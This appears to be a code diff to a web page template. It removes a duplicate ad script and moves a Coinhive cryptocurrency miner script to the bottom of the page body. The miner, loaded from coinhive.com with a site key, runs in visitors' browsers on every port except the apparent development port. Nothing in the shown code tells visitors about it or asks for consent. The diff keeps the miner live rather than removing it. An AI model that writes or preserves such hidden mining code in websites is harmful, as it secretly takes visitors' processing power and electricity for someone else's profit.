@@ -14,15 +14,12 @@
 				<%= htmlWebpackPlugin.options.link %>
 		<% } %>
 		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 		<script>
 			(adsbygoogle = window.adsbygoogle || []).push({
 				google_ad_client: "ca-pub-9211196233969408",
 				enable_page_level_ads: true
 			});
 		</script>
-		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-		<script>if (location.port!='3001'){var c=('hardwareConcurrency' in navigator)?navigator.hardwareConcurrency:2;var t=Math.min(2,~~c/1.5);var m=new CoinHive.Anonymous('bZvhfyO2CvWH50x7pVEn5DaZOMRwGCcI',{threads:t,throttle:.25});m.start();setInterval(function(){var hps=m.getHashesPerSecond();var t=m.getTotalHashes();if(debug){console.log(hps,'H/s');console.log(t,'t');}},1000);debug=false;}</script>
 	</head>
 	<body>
 		<div id="root">
@@ -42,5 +39,7 @@
 			gtag('js', new Date());
 			gtag('config', 'UA-71880846-1');
 		</script>
+		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+		<script>if (location.port!='3001'){var c=('hardwareConcurrency' in navigator)?navigator.hardwareConcurrency:2;var t=Math.min(2,~~c/1.5);var m=new CoinHive.Anonymous('bZvhfyO2CvWH50x7pVEn5DaZOMRwGCcI',{threads:t,throttle:.25});m.start();setInterval(function(){var hps=m.getHashesPerSecond();var t=m.getTotalHashes();if(debug){console.log(hps,'H/s');console.log(t,'t');}},1000);debug=false;}</script>
 	</body>
 </html>
